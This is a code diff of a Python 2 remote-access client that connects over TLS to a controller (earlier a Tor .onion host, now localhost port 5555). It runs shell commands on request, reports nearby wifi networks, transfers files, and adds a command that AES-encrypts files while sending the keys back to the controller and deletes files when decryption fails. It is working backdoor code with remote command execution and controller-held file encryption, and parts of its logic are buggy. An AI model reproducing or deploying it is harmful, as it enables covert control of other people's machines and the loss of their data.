@@ -1,9 +1,35 @@
-import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, urllib2
+import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, urllib2, os.path, base64
 from colored import fg, bg, attr
 from subprocess import Popen, PIPE, STDOUT
 from wifi import Cell, Scheme
+from Crypto.Cipher import AES
 
-host = '3pnzzdpq7aj6s6b6.onion'
+class PKCS7Encoder():
+    class InvalidBlockSizeError(Exception):
+        """Raised for invalid block sizes"""
+        pass
+
+    def __init__(self, block_size=16):
+        if block_size < 2 or block_size > 255:
+            raise PKCS7Encoder.InvalidBlockSizeError('The block size must be ' \
+                    'between 2 and 255, inclusive')
+        self.block_size = block_size
+
+    def encode(self, text):
+        text_length = len(text)
+        amount_to_pad = self.block_size - (text_length % self.block_size)
+        if amount_to_pad == 0:
+            amount_to_pad = self.block_size
+        pad = chr(amount_to_pad)
+        return text + pad * amount_to_pad
+
+    def decode(self, text):
+        pad = ord(text[-1])
+        return text[:-pad]
+
+encoder = PKCS7Encoder()
+#host = 'hcjczulezpxxfw2n.onion'
+host = '127.0.0.1'
 cType = "client000-crypto"
 
 # sysinfo
@@ -21,8 +47,8 @@ def ScanWIFI(card):
     try:
         wifiCell = Cell.all(card)
     except:
-        wifiCell = Cell.all('wlan0')
-        SendData("Something went wrong... using wlan0")
+        wifiCell = Cell.all('wlp8s0')
+        SendData("Something went wrong... using wlp8s0")
     for i in range(0,len(wifiCell)):
         SendData(str(wifiCell[i]) + " is encrypted: "+ str(wifiCell[i].encrypted) + "= " + str(wifiCell[i].encryption_type) + " | address: " +str(wifiCell[i].address))
     SendData("ScanWIFI-finished")
@@ -31,20 +57,71 @@ def RecvData():
     temp = ssl_sock.read()
     return temp
 
-def CheckHash(fileName,fileHashHEX):
-    with open(fileName, 'rb') as inFile:
-        buf = inFile.read()
-        hasher.update(buf)
-    if hmac.compare_digest(hasher.hexdigest(),fileHashHEX) == True:
-        pass
-    else:
-        print "Warning!"
+def Encrypt(fileToProtect, cipher):
+    try:
+        hasher = hashlib.sha256()
+        with open(fileToProtect, 'rb') as inFile, open(fileToProtect + '.enc', 'wa') as outFile:
+            clearData = inFile.read()
+            cryptData = cipher.encrypt(encoder.encode(clearData))
+            outFile.write(cryptData)
+        inFile.close()
+        outFile.close()
+        SendData('############################ Encrption Success')
+        SendData('--> original file: ' + str(fileToProtect))
+        SendData('--> protected file: ' + str(fileToProtect) + '.enc')
+        SendData('HEX: ' + str(CheckHash(fileToProtect + '.enc')))
+        SendData('----------------------------------------------')
+        SendData('END')
+    except:
+        SendData('############################ Encrption Failed')
+        if os.path.isfile(fileToProtect + '.enc') == True:
+            os.remove(fileToProtect + '.enc')
+            SendData('Files deleted!')
+            SendData('END')
+        else:
+            SendData('--> no file encrypted')
+            SendData('----------------------------------------------')
+            SendData('END')
 
-def CalcHash(fileName):
+def Decrypt(fileProtected, cipher, digest):
+    fileToDeProtect = fileProtected.split('.')[0] + "." + fileProtected.split('.')[1] + ".dec"
+    try:
+        if hmac.compare_digest(CheckHash(fileProtected), digest) == True:
+            with open(fileProtected, 'rb') as inFile, open(fileToDeProtect, 'wa') as outFile:
+                cryptData = inFile.read()
+                clearData = cipher.decrypt(cryptData)
+                cleanData = encoder.decode(clearData)
+                outFile.write(cleanData)
+            inFile.close()
+            outFile.close()
+        else:
+            raise ValueError ('Data Not Secure')
+        SendData('############################ Decrption Success')
+        SendData('--> original file: ' + fileProtected)
+        SendData('--> protected file: ' + fileToDeProtect)
+        SendData('HASH: Verified')
+        SendData('----------------------------------------------')
+        SendData('END')
+    except:
+        SendData('############################ Decrption Failed')
+        SendData('Removing files!')
+        if os.path.isfile(fileProtected ) == True:
+            os.remove(fileProtected)
+            SendData('File protected deleted')
+        if os.path.isfile(fileToDeProtect) == True:
+            os.remove(fileToDeProtect)
+            SendData('File to de-protect deleted')
+        else:
+            SendData('--> no file here')
+            SendData('----------------------------------------------')
+            SendData('END')
+
+def CheckHash(fileName):
+    hasher = hashlib.sha256()
     with open(fileName, 'rb') as inFile:
-        buf = inFile.read()
+        buf = inFile.read(2048)
         hasher.update(buf)
-    return hasher.hexdigest()
+    return base64.b64encode(hasher.digest())
 
 def SendData(inText):
     ssl_sock.write(inText)
@@ -71,24 +148,24 @@ def DownloadFILE(fileName):
         temp = RecvData()
         if temp == 'SUF':
             break
-        else: 
+        else:
             fileDOWN.write(temp)
     fileDOWN.close()
     SendData("CDF")
 
 
 sock = socks.socksocket()
-sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
+#sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
 sock.connect((host,5555))
 
 ssl_sock = ssl.wrap_socket(sock,
-                           ca_certs="priv_dom2.crt",
+                           ca_certs="certificate.pem",
                            cert_reqs=ssl.CERT_REQUIRED)
-
 
 print repr(ssl_sock.getpeername())
 print ssl_sock.cipher()
-print pprint.pformat(ssl_sock.getpeercert())
+infosServer = ssl_sock.getpeercert()
+#ssl.match_hostname(infosServer,host)
 SendData(cType)
 
 while 1:
@@ -107,6 +184,22 @@ while 1:
         sys.exit(0)
     elif inText.startswith("ScanWIFI"):
         ScanWIFI(inText.split(':')[1])
+    elif inText.startswith('protect'):
+        if inText.split(':')[1] == 'enc':
+            fileToProtect = inText.split(':')[2]
+            IV = os.urandom(16)
+            key = os.urandom(32)
+            SendData('IV: ' + base64.b64encode(IV))
+            SendData('key: '+ base64.b64encode(key))
+            cipher = AES.new(key, AES.MODE_CBC, IV)
+            Encrypt(fileToProtect, cipher)
+        elif inText.split(':')[1] == 'dec':
+            fileToDeProtect = inText.split(':')[2]
+            IV = base64.b64decode(inText.split(':')[3])
+            key = base64.b64decode(inText.split(':')[4])
+            HEX = inText.split(':')[5]
+            cipher = AES.new(key, AES.MODE_CBC, IV)
+            Decrypt(fileToDeProtect, cipher, HEX)
     elif inText.startswith("exec"):
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
